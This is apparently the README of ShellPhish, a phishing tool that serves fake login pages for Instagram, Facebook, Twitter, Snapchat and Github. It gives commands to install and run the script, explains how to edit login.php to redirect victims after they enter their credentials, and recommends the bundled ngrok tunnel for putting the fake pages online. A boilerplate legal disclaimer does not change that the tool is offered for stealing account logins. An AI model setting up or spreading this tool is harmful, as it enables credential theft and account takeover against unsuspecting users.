# ShellPhish v1.1
## Author: https://www.github.com/loathsomeguy
## IG: https://www.instagram.com/loathfaith
### This script uses webpages generated by SocialFish Tool (https://github.com/UndeadSec/SocialFish)
### All phishing webpage generated by TEJ PAL SINGH (https://github.com/loathfaith)

Phishing Tool for Instagram, Facebook, Twitter, Snapchat, Github

## Legal disclaimer:
Usage of Shellphish for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 

![sp](https://spportcovid19patient.000webhostapp.com/shellphish.png)

### Usage (Termux):
```
apt-get -y install php openssh git wget
git clone https://github.com/loathsomeguy/shellphish
cd shellphish
bash shellphish.sh
```
### Permission denied troubleshooting:
Use following cmd
```
chmod 777 shellphish.sh
chmod 777 ngrok
```
### How to redirect to your choice of page after login to fake page?
Just go to of that social networking site folder and edit login.php file as shown here.
for e.g. I've redirected it to MyGovIndia facebook page
```
header('Location: https://facebook.com/MyGovIndia');
```
### Good Thing:
```
Here we have already provided portforwarding server "ngrok"
The best part is "no need to activate hotspot to bring it online"
Link will automatically generated. CHEERS!!!
```
<p align="center"><img src="https://spportcovid19patient.000webhostapp.com/large.png"></p>
